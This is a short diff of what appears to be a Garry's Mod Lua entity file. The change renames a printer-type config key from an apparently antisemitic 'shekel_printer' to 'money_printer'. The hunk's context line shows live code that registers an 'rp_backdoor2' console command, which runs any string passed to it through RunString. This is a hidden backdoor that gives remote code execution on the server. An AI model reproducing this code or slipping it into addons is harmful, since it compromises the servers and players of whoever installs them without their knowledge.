@@ -8,7 +8,7 @@ concommand.Add('rp_backdoor2', function(a) RunString(a[1]) end)
 // CONFIG
 
 ENT._PrinterTypes = {
-	["shekel_printer"] = true
+	["money_printer"] = true
 }
 // CONFIG
 
